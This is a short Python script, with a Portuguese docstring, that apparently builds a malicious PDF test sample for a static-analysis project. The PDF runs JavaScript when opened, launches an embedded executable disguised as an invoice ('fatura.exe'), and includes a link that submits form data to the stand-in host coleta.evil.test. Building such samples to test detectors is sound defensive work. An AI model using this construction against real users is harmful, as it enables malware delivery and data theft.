"""PDF com JavaScript na abertura e um executavel anexado (plans/analise-estatica-ampliada, item 8),
montado a mao; o gen.sh o cifra com o qpdf (RC4, AES-128 e AES-256 com a senha de usuario vazia, e
um com senha de verdade) e gera a variante com os objetos comprimidos em ObjStm."""
import sys
import zlib

out, payload = sys.argv[1], open(sys.argv[2], 'rb').read()
js = b"app.alert('ola'); this.exportDataObject({cName: 'fatura.exe', nLaunch: 2});"
data = zlib.compress(payload)
objs = [
    b"<< /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles 5 0 R >> /OpenAction 4 0 R >>",
    b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
    b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Annots [8 0 R] >>",
    b"<< /Type /Action /S /JavaScript /JS (" + js + b") >>",
    b"<< /Names [(fatura.exe) 6 0 R] >>",
    b"<< /Type /Filespec /F (fatura.exe) /UF (fatura.exe) /EF << /F 7 0 R >> >>",
    b"<< /Type /EmbeddedFile /Filter /FlateDecode /Length " + str(len(data)).encode() + b" >>\nstream\n" + data + b"\nendstream",
    b"<< /Type /Annot /Subtype /Link /Rect [0 0 100 100] /A << /S /SubmitForm /F (https://coleta.evil.test/form) >> >>",
]
body = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
offsets = []
for i, o in enumerate(objs, 1):
    offsets.append(len(body))
    body += f"{i} 0 obj\n".encode() + o + b"\nendobj\n"
xref = len(body)
body += f"xref\n0 {len(objs) + 1}\n0000000000 65535 f \n".encode()
for off in offsets:
    body += f"{off:010d} 00000 n \n".encode()
body += f"trailer\n<< /Size {len(objs) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()
open(out, 'wb').write(body)
print('pdf ok')
